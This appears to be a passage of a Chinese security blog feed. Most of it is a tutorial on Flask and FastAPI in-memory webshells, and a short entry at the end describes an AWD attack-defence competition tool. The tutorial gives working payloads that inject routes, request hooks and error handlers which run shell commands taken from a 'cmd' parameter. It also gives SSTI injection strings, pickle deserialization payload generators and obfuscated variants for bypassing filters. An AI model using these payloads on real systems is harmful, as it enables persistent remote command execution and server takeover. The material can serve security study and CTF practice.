&#125;</code></pre><p>这个参数是eval的命名空间，<code>_request_ctx_stack</code>是一个请求上下文栈。请求上下文是指在处理HTTP请求的过程中，Flask创建的一个临时环境，用来存储和管理与当前请求相关的信息，例如当前请求的<code>request</code>对象，其中就包括了HTTP请求的所有细节。</p><p><code>url_for.__globals__[&#39;current_app&#39;]</code>是当前运行的app。</p><p>接下来看第一个参数，也就是执行的代码：</p><pre><code class="python">&quot;app.add_url_rule(        &#39;/shell&#39;,         &#39;shell&#39;,         lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read()        )    &quot;</code></pre><p>很明显，这里调用了Flask对象的<code>add_url_rule</code>方法，看一下源码实现</p><p><img src="https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202408181230990.png" alt="image-20240818123004028"></p><p>在Flask中注册路由是使用<code>@app.route()</code>装饰器来实现的，这里就是用了add_url_rule() 来动态的添加路由，包括了6个参数：</p><pre><code class="python">@setupmethoddef add_url_rule(    self,    rule: str,#函数对应的URL规则,满足条件和app.route()的第一个参数一样,必须以/开头；    endpoint: str | None = None,#端点,即在使用url_for()进行反转的时候,这里传入的第一个参数就是endpoint对应的值.这个值也可以不指定,那么默认就会使用函数的名字作为endpoint的值；    view_func: ft.RouteCallable | None = None,#URL对应的函数（注意,这里只需写函数名字而不用加括号）；    provide_automatic_options: bool | None = None,#控制是否应自动添加选项方法.这也可以通过设置视图来控制_func.provide_automatic_options =添加规则前为False；    **options: t.Any,#要转发到基础规则对象的选项.Werkzeug的一个变化是处理方法选项.方法是此规则应限制的方法列表（GET、POST等）.默认情况下,规则只侦听GET（并隐式地侦听HEAD）.从Flask0.6开始,通过标准请求处理隐式添加和处理选项；) -&gt; None:</code></pre><p>由此可见，这个方法可以根据传入的参数动态地添加一个路由，其中我们可以指定用于处理这个路由的视图函数。在这个payload里，我们定义了一个匿名函数用于处理这个路由的请求。</p><pre><code class="python">lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read()</code></pre><p>为了获取我们注入的命令，我们还需要当前HTTP请求的<code>request</code>对象，这也就是我们一开始要获取<code>_request_ctx_stack</code>的原因。在这个栈里，栈顶的元素<code>_request_ctx_stack.top</code>自然就是我们当前请求的上下文，其中包含我们需要的<code>request</code>对象，于是我们就可以获取当前请求GET传参的值，进而执行我们传入的命令。</p><p>这就是旧版Flask内存马的原理。</p><p>在旧版Flask内存马中需要注意一个点就是当前app的获取，需要确实获取到当前正在运行的app，这里所用的技巧和沙箱逃逸是一致的。</p><h3 id="sys-modules"><a href="#sys-modules" class="headerlink" title="sys.modules"></a>sys.modules</h3><pre><code class="python">url_for.__globals__[&#39;sys&#39;].modules[&#39;__main__&#39;].__dict__[&#39;app&#39;]url_for.__globals__[&#39;sys&#39;].modules[&#39;__main__&#39;].__dict__[&#39;app&#39;].add_url_rule(&#39;/shell&#39;,&#39;shell&#39;,lambda :__import__(&#39;os&#39;).popen(&#39;dir&#39;).read())</code></pre><p>pickle同理，关键是如何拿到正在运行的app。</p><p>如果直接 import app.py 来获取app是不行的，此app非彼app，添加了路由但是并不能访问到，应该是一个全新的app。</p><blockquote><p>sys.modules是一个全局字典，该字典是python启动后就加载在内存中。每当程序员导入新的模块，sys.modules都将记录这些模块。字典sys.modules对于加载模块起到了缓冲的作用。当某个模块第一次导入，字典sys.modules将自动记录该模块。当第二次再导入该模块时，python会直接到字典中查找，从而加快了程序运行的速度。</p></blockquote><p>所以我们可以通过sys.modules拿到当前已经导入的模块，并且获取模块中的属性，由于我们最终的eval是在app.py中执行的，所以我们可以通过<code>sys.modules[&#39;__main__&#39;]</code>来获取当前的模块。</p><hr><h2 id="新版本内存马"><a href="#新版本内存马" class="headerlink" title="新版本内存马"></a>新版本内存马</h2><p>如果我们尝试在新版Flask跑起来的web应用中用旧版的方式挂内存马就会有如下报错。</p><p><img src="https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202408181307090.png" alt="image-20240818130715344"></p><p>看调用栈能发现这个报错是<code>_check_setup_finished()</code>这个函数抛出的</p><p><img src="https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202408181310735.png" alt="image-20240818131000712"></p><p>意思就是这个app已经跑起来了，这个函数就不能再被调用了。调试之后发现这个方法的<code>@setupmethod</code>装饰器会先check一次，所以基本上是完全不能用了。</p><hr><p>新版内存马的第一种实现方式是用<code>before_request()</code>装饰器或者<code>after_request()</code>装饰器在一个请求前&#x2F;后执行自己注入的代码，进而实现挂马的操作。我们要先了解什么是装饰器</p><blockquote><p>python装饰器</p><p>装饰器本质上是一个可调用的对象(函数或类), 它接收一个函数或类座位参数，并返回一个新的函数或类。这个新的函数或类通常会保留原始函数或类的功能，但会在其基础上添加一些额外的逻辑。</p></blockquote><p>我们以这个路由进行测试：</p><pre><code class="python">@app.route(&#39;/cmd&#39;)def cmd():    flag = eval(request.args.get(&#39;cmd&#39;))    if flag :        return &quot;1&quot;    else:        return &quot;0&quot;</code></pre><h3 id="before-request"><a href="#before-request" class="headerlink" title="before_request"></a>before_request</h3><blockquote><p>在 Flask 中，before_request是一个装饰器，它用于在请求处理之前执行特定的函数。</p><p>这个装饰器允许对每个请求进行一些预处理，比如认证检查、日志记录、设置响应头等</p></blockquote><p>我们看一下他是如何实现的</p><p><img src="https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202408181314228.png" alt="image-20240818131435183"></p><p>可以看到这里实际上调用的是</p><pre><code class="python">self.before_request_funcs.setdefault(None, []).append(f)</code></pre><p>解释：</p><ul><li>检查 <code>self.before_request_funcs</code> 字典中是否有一个键为 <code>None</code> 的条目。</li><li>如果没有 <code>None</code> 键，就在字典中创建它，并将其值设置为一个空列表。</li><li>然后，无论 <code>None</code> 键是否存在，都将函数 <code>f</code> 添加到这个列表中。</li></ul><p>那么这个<code>f</code>就是我们添加的函数了，于是我们同样可以自定义一个 lambda 函数，这样在每次发起请求前就都会触发了</p><p>于是可以构造我们的payload：</p><pre><code class="python">__import__(&#39;sys&#39;).modules[&#39;__main__&#39;].__dict__[&#39;app&#39;].before_request_funcs.setdefault(None,[]).append(lambda :__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read())</code></pre><p>测试：</p><p><img src="https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202408181328193.png" alt="image-20240818132757826"></p><p>但是使用before_request()有一个问题就是，执行了之后访问所有页面都会是匿名函数返回的结果，可能会被搭便车，也会影响到主机的正常业务，也很容易被发现，使用after_request()就能避免这个问题。</p><hr><h3 id="after-request"><a href="#after-request" class="headerlink" title="after_request"></a>after_request</h3><p>和 before_request 相反，<code>after_request</code>会在请求结束得到响应包之后进行操作</p><p><img src="https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202408181353286.png" alt="image-20240818135301009"></p><p>和前面一样，唯一要注意的是这个需要定义一个返回值，不然就会报错。</p><p>payload：</p><pre><code class="python">app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#39;cmd&#39;) and exec(&#39;global r;r=app.make_response(__import__(&#39;os&#39;).popen(request.args.get(&#39;cmd&#39;)).read())&#39;)==None else resp)</code></pre><p>逐行解释这段代码</p><pre><code class="python">lambda resp: #传入参数    CmdResp if request.args.get(&#39;cmd&#39;) and      #如果请求参数含有cmd则返回命令执行结果    exec(&#39;        global r;     #定义一个全局变量,方便获取        r=app.make_response(__import__(&#39;os&#39;).popen(request.args.get(\&#39;cmd\&#39;)).read())   #创建一个响应对象    &#39;)==None    #恒真    else resp)  #如果请求参数没有cmd则正常返回#这里的cmd参数名和r变量名都是可以改的</code></pre><p>执行后就会将get传入的cmd参数作为系统命令执行,如果没有传入cmd就显示正常的界面.</p><p>简化版不带出回显,适用于过滤严格的场景</p><pre><code class="python">app.after_request_funcs.setdefault(None, []).append(lambda x:__import__(&quot;os&quot;).popen(request.args.get(&quot;cmd&quot;)))</code></pre><h2 id="Flask中的钩子函数"><a href="#Flask中的钩子函数" class="headerlink" title="Flask中的钩子函数"></a>Flask中的钩子函数</h2><p>其实<code>after_request()</code>和<code>before_request()</code>有一个共同的分类叫钩子函数。钩子函数是指在执行函数和目标函数之间挂载的函数，框架开发者给调用方提供一个point-挂载点，至于挂载什么函数由调用方决定。</p><h3 id="before-first-request"><a href="#before-first-request" class="headerlink" title="before_first_request"></a><strong>before_first_request</strong></h3><p>在对应用程序实例的第一个请求之前注册要运行的函数，只会运行一次。</p><h3 id="before-request-1"><a href="#before-request-1" class="headerlink" title="before_request"></a><strong>before_request</strong></h3><p>在每个请求之前注册一个要运行的函数，每一次请求都会执行一次。</p><h3 id="after-request-1"><a href="#after-request-1" class="headerlink" title="after_request"></a><strong>after_request</strong></h3><p>在每个请求之后注册一个要运行的函数，每次请求完成后都会执行。需要接收一个 Response 对象作为参数，并返回一个新的 Response 对象，或者返回接收的 Response 对象。</p><h3 id="teardown-request"><a href="#teardown-request" class="headerlink" title="teardown_request"></a><strong>teardown_request</strong></h3><p>注册在每一个请求的末尾，不管是否有异常，每次请求的最后都会执行。<code>无回显。</code></p><p>payload：</p><pre><code class="python">app.teardown_request_funcs.setdefault(None, []).append(lambda :__import__(&#39;os&#39;).popen(&quot;calc&quot;).read())</code></pre><p>不能调用<code>request.args.get()</code>动态执行传入的命令，但是可以执行注入的代码。每次刷新网页都会执行，原因是这个装饰器的触发是在请求被销毁后的，在这个时候上一个HTTP请求帧已经被销毁了，但是可以执行静态命令。</p><h3 id="teardown-appcontext"><a href="#teardown-appcontext" class="headerlink" title="teardown_appcontext"></a><strong>teardown_appcontext</strong></h3><p>不管是否有异常，注册的函数都会在每次请求之后执行。</p><p>flask 为上下文提供了一个<code>teardown_appcontext</code>钩子，使用它注册的毁掉函数会在程序上下文被销毁时调用，通常也在请求上下文被销毁时调用。</p><p>某些情况下这个函数和**@teardown_request**的行为是类似的，一个是请求上下文被销毁时被调用，另一个是应用上下文被销毁时调用。</p><blockquote><p>比如你需要在每个请求处理结束后销毁数据库连接：app.teardown_appcontext 装饰器注册的回调函数需要接收异常对象作为参数，当请求被正常处理时这个参数将是None，这个函数的返回值将被忽略.</p></blockquote><p>payload：</p><pre><code class="python">app.teardown_appcontext_funcs.append(lambda x :__import__(&#39;os&#39;).popen(&quot;calc&quot;).read())</code></pre><h3 id="context-processor"><a href="#context-processor" class="headerlink" title="context_processor"></a><strong>context_processor</strong></h3><p>上下文处理器，返回的字典可以在全部的模板中使用。</p><h3 id="template-filter-‘upper’"><a href="#template-filter-‘upper’" class="headerlink" title="template_filter(‘upper’)"></a><strong>template_filter(‘upper’)</strong></h3><p>增加模板过滤器，可以在模板中使用该函数，后面的参数是名称，在模板中用到。</p><h3 id="errorhandler-400"><a href="#errorhandler-400" class="headerlink" title="errorhandler(400)"></a><strong>errorhandler(400)</strong></h3><p>发生一些异常时，比如404,500，或者抛出异常(Exception)之类的，就会自动调用该钩子函数。</p><ol><li>发生请求错误时，框架会自动调用相应的钩子函数，并向钩子函数中传入error参数</li><li>如果钩子函数没有定义error参数，就会报错</li><li>可以使用<code>abort(http status code)</code>函数来手动终止请求抛出异常，如果要是发生参数错误，可以abort(404)之类的</li></ol><pre><code class="python">@app.errorhandler(404)def errortest(e):    print(&#39;error_handler(404)&#39;)    print(e)    return &#39;404 Err0r&#39;</code></pre><p><img src="https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202408181444644.png" alt="image-20240818144454796"></p><p>跟进这个装饰器的底层逻辑</p><p><img src="https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202408181446568.png" alt="image-20240818144655739"></p><p>可以发现他给这个<code>self.error_hander_spec</code>这个字典里添加了一个函数，就是错误处理函数</p><p>也就是说现在的重点变成了如何控制这个<code>code</code>和<code>exc_class</code>，如果能控制这两个值，我们就可以利用错误处理的逻辑执行我们传入的函数</p><p><img src="https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202408181452334.png" alt="image-20240818145214688"></p><p>直接<code>_get_exc_class_and_code(404)</code>，这样就能返回常规的变量了。</p><p>payload：</p><pre><code class="python">exec(&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#39;os&#39;).popen(request.args.get(&#39;cmd&#39;)).read()&quot;)</code></pre><p><img src="https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202408181454140.png" alt="image-20240818145410036"></p><hr><h1 id="SSTI利用"><a href="#SSTI利用" class="headerlink" title="SSTI利用"></a>SSTI利用</h1><p>考虑到上下文没有导入包的情况</p><p>注：部分flask版本下无法使用<code>url_for.__globals__[&#39;current_app&#39;]</code>来获取app，因此这里改用<code>sys.modules</code></p><pre><code class="python">&#123;&#123;url_for.__globals__['__builtins__']['eval']("app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('cmd') and exec(\"global CmdResp;CmdResp=__import__(\'flask\').make_response(__import__(\'os\').popen(request.args.get(\'cmd\')).read())\")==None else resp)",&#123;'request':url_for.__globals__['request'],'app':url_for.__globals__['sys'].modules['__main__'].__dict__['app']&#125;)&#125;&#125;</code></pre><pre><code class="python">&#123;&#123;url_for.__globals__['__builtins__']['eval']("exec(\"global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__('os').popen(request.args.get('cmd')).read()\")",&#123;'request':url_for.__globals__['request'],'app':url_for.__globals__['sys'].modules['__main__'].__dict__['app']&#125;)&#125;&#125;</code></pre><p><img src="https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202408181507259.png" alt="image-20240818150733949"></p><p>针对FastAPI，不能用add_url_rule添加内存马，得用add_api_route添加内存马。</p><pre><code class="python">undefinded.__class__.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;sys&#39;).modules[&#39;__main__&#39;].__dict__[&#39;app&#39;].add_api_route(&#39;/flag&#39;,lambda:__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read())&quot;)config.__init__.__globals__[&#39;__builtins__&#39;][&#39;exec&#39;](&#39;app.add_api_route(&quot;/flag&quot;,lambda:__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read());&#39;,&#123;&quot;app&quot;:app&#125;)</code></pre><p><img src="https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202408181535762.png" alt="image-20240818153210118"></p><p><img src="https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202408181535440.png" alt="image-20240818153258387"></p><p><img src="https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202408181535423.png" alt="image-20240818153306271"></p><hr><h1 id="pickle利用"><a href="#pickle利用" class="headerlink" title="pickle利用"></a>pickle利用</h1><p>before_request：</p><pre><code class="python">import osimport pickleimport base64class A():    def __reduce__(self):        return (eval,(&quot;__import__(\&quot;sys\&quot;).modules[&#39;__main__&#39;].__dict__[&#39;app&#39;].before_request_funcs.setdefault(None, []).append(lambda :__import__(&#39;os&#39;).popen(request.args.get(&#39;cmd&#39;)).read())&quot;,))a = A()b = pickle.dumps(a)print(base64.b64encode(b))</code></pre><p>after_request：</p><pre><code class="python">import osimport pickleimport base64class A():    def __reduce__(self):        return (eval,(&quot;__import__(&#39;sys&#39;).modules[&#39;__main__&#39;].__dict__[&#39;app&#39;].after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#39;cmd&#39;) and exec(\&quot;global CmdResp;CmdResp=__import__(\&#39;flask\&#39;).make_response(__import__(\&#39;os\&#39;).popen(request.args.get(\&#39;cmd\&#39;)).read())\&quot;)==None else resp)&quot;,))a = A()b = pickle.dumps(a)print(base64.b64encode(b))</code></pre><p>error_handler：</p><pre><code class="python">import osimport pickleimport base64class A():    def __reduce__(self):        return (exec,(&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#39;os&#39;).popen(request.args.get(&#39;cmd&#39;)).read()&quot;,))a = A()b = pickle.dumps(a)print(base64.b64encode(b))</code></pre><hr><h1 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h1><p>在实际应用中往往都存在过滤, 因此了解如何绕过还是必要的</p><ul><li><code>url_for</code>可替换为<code>get_flashed_messages</code>或者<code>request.__init__</code>或者<code>request.application</code>.</li><li>代码执行函数替换, 如<code>exec</code>等替换<code>eval</code>.</li><li>字符串可采用拼接方式, 如<code>[&#39;__builtins__&#39;][&#39;eval&#39;]</code>变为<code>[&#39;__bui&#39;+&#39;ltins__&#39;][&#39;ev&#39;+&#39;al&#39;]</code>.</li><li><code>__globals__</code>可用<code>__getattribute__(&#39;__globa&#39;+&#39;ls__&#39;)</code>替换.</li><li><code>[]</code>可用<code>.__getitem__()</code>或<code>.pop()</code>替换.</li><li>过滤<code>&#123;&#123; &#125;&#125;</code> , 可以使用 <code>&#123;% %&#125;</code> 绕过, <code>&#123;%%&#125;</code>中间可以执行<code>if</code>语句, 利用这一点可以进行类似盲注的操作或者外带代码执行结果.</li><li>过滤<code>_</code>可以用编码绕过, 如<code>__class__</code>替换成<code>\x5f\x5fclass\x5f\x5f</code>, 还可以用<code>dir(0)[0][0]</code>或者<code>request[&#39;args&#39;]</code>或者<code>request[&#39;values&#39;]</code>绕过.</li><li>过滤了<code>.</code>可以采用<code>attr()</code>或<code>[]</code>绕过.</li><li>其它的手法参考<code>SSTI</code>绕过过滤的方法即可…</li></ul><p>这里给出两个变形<code>Payload</code>:</p><ul><li><p>原payload：</p><pre><code class="python">url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;app.add_url_rule(&#39;/shell&#39;, &#39;shell&#39;, lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;shell&#39;)).read())&quot;,&#123;&#39;_request_ctx_stack&#39;:url_for.__globals__[&#39;_request_ctx_stack&#39;],&#39;app&#39;:url_for.__globals__[&#39;current_app&#39;]&#125;)</code></pre></li><li><p>变形payload-1:</p><pre><code class="python">request.application.__self__._get_data_for_json.__getattribute__(&#39;__globa&#39;+&#39;ls__&#39;).__getitem__(&#39;__bui&#39;+&#39;ltins__&#39;).__getitem__(&#39;ex&#39;+&#39;ec&#39;)(&quot;app.add_url_rule(&#39;/shell&#39;, &#39;shell&#39;, lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;shell&#39;)).read())&quot;,&#123;&#39;_request_ct&#39;+&#39;x_stack&#39;:get_flashed_messages.__getattribute__(&#39;__globa&#39;+&#39;ls__&#39;).pop(&#39;_request_&#39;+&#39;ctx_stack&#39;),&#39;app&#39;:get_flashed_messages.__getattribute__(&#39;__globa&#39;+&#39;ls__&#39;).pop(&#39;curre&#39;+&#39;nt_app&#39;)&#125;)</code></pre></li><li><p>变形payload-2：</p><pre><code class="python">get_flashed_messages|attr(&quot;\x5f\x5fgetattribute\x5f\x5f&quot;)(&quot;\x5f\x5fglobals\x5f\x5f&quot;)|attr(&quot;\x5f\x5fgetattribute\x5f\x5f&quot;)(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(&quot;__builtins__&quot;)|attr(&quot;\x5f\x5fgetattribute\x5f\x5f&quot;)(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(&quot;\u0065\u0076\u0061\u006c&quot;)(&quot;app.add_ur&quot;+&quot;l_rule(&#39;/shell&#39;, &#39;shell&#39;, la&quot;+&quot;mbda :__imp&quot;+&quot;ort__(&#39;o&quot;+&quot;s&#39;).po&quot;+&quot;pen(_request_c&quot;+&quot;tx_stack.to&quot;+&quot;p.re&quot;+&quot;quest.args.get(&#39;shell&#39;)).re&quot;+&quot;ad())&quot;,&#123;&#39;\u005f\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u005f\u0063\u0074\u0078\u005f\u0073\u0074\u0061\u0063\u006b&#39;:get_flashed_messages|attr(&quot;\x5f\x5fgetattribute\x5f\x5f&quot;)(&quot;\x5f\x5fglobals\x5f\x5f&quot;)|attr(&quot;\x5f\x5fgetattribute\x5f\x5f&quot;)(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(&quot;\u005f\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u005f\u0063\u0074\u0078\u005f\u0073\u0074\u0061\u0063\u006b&quot;),&#39;app&#39;:get_flashed_messages|attr(&quot;\x5f\x5fgetattribute\x5f\x5f&quot;)(&quot;\x5f\x5fglobals\x5f\x5f&quot;)|attr(&quot;\x5f\x5fgetattribute\x5f\x5f&quot;)(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(&quot;\u0063\u0075\u0072\u0072\u0065\u006e\u0074\u005f\u0061\u0070\u0070&quot;)&#125;)</code></pre><hr></li></ul><p>参考：</p><p><a href="https://xz.aliyun.com/t/14539">https://xz.aliyun.com/t/14539</a></p><p><a href="https://xz.aliyun.com/t/10933">https://xz.aliyun.com/t/10933</a></p><p><a href="https://c1oudfl0w0.github.io/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/">Flask内存马 | 雲流のLowest World (c1oudfl0w0.github.io)</a></p><p><a href="https://www.cnblogs.com/gxngxngxn/p/18181936">新版FLASK下python内存马的研究 - gxngxngxn - 博客园 (cnblogs.com)</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;好久之前在各位师傅的博客里看过，语雀里一直贴着链接，这里暂且记录一下相关知识点。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概念&quot;&gt;&lt;/a&gt;概念&lt;/h1&gt;&lt;p&gt;常用的Python框架有&lt;code&gt;Django&lt;/code&gt;、&lt;code&gt;Flask&lt;/code&gt;，这两者都可能存在&lt;code&gt;SSTI&lt;/code&gt;漏洞。</summary>
    
    
    
    <category term="WEB" scheme="http://example.com/categories/WEB/"/>
    
    
    <category term="flask" scheme="http://example.com/tags/flask/"/>
    
    <category term="python" scheme="http://example.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>AWD_tool开发</title>
    <link href="http://example.com/2024/08/12/AWD-tool%E5%BC%80%E5%8F%91/"/>
    <id>http://example.com/2024/08/12/AWD-tool%E5%BC%80%E5%8F%91/</id>
    <published>2024-08-12T14:17:45.000Z</published>
    <updated>2024-08-14T00:38:00.606Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>针对AWD比赛，从各种情景和需求所开发的自动化集成工具。后续会一直更新和完善……</p><p>目前可满足的功能：目标生成、扫描，原始后门利用，批量命令执行，木马升级(可支持四种马)，批量ssh操作，一键危险函数检测，文件备份，文件监控，日志<span id="more"></span>监控等等。</p><hr><h2 id="一、扫描模块"><a href="#一、扫描模块" class="headerlink" title="一、扫描模块"></a>一、扫描模块</h2><p>如果已知靶机地址，即不需要扫描，按任意键只生成地址即可。 </p><p>如靶机地址为 192.168.0.100-255 的80端口，在 ip.txt 中会生成对应地址。</p><p>如果未知靶机地址，需要借助 fscan.exe 来扫描(已集成于工具无需配置)，在 ip.txt 中可得到扫描结果，可以在 fscan.py 中修改匹配规则，只获取80端口开放情况。</p><h2 id="二、攻击模块"><a href="#二、攻击模块" class="headerlink" title="二、攻击模块"></a>二、攻击模块</h2>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;针对AWD比赛，从各种情景和需求所开发的自动化集成工具。后续会一直更新和完善……&lt;/p&gt;
&lt;p&gt;目前可满足的功能：目标生成、扫描，原始后门利用，批量命令执行，木马升级(可支持四种马)，批量ssh操作，一键危险函数检测，文件备份，文件监控，日志</summary>
    
    
    
    <category term="WEB" scheme="http://example.com/categories/WEB/"/>
    
    <category term="项目" scheme="http://example.com/categories/WEB/%E9%A1%B9%E7%9B%AE/"/>
    
    <category term="AWD" scheme="http://example.com/categories/WEB/%E9%A1%B9%E7%9B%AE/AWD/"/>
    
    
    <category term="awd" scheme="http://example.com/tags/awd/"/>
    
    <category term="自动化" scheme="http://example.com/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"/>
    
  </entry>
  
</feed>
